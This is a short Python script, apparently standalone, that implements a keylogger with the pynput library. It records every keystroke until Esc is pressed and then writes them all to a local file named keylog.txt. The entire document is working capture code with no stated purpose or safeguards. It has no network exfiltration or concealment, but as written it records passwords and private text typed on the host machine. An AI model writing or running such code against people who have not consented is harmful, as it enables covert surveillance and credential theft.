from pynput.keyboard import Key, Listener

the_keys = []

def on_key_press(key):
    try:
        the_keys.append(key.char)
    except AttributeError:
        the_keys.append(str(key))

def on_key_release(key):
    if key == Key.esc:
        return False

def store_keys_to_file(keys):
    with open('keylog.txt', 'w') as log_file:
        for key in keys:
            log_file.write(str(key) + '\n')

with Listener(on_press=on_key_press, on_release=on_key_release) as listener:
    listener.join()

store_keys_to_file(the_keys)

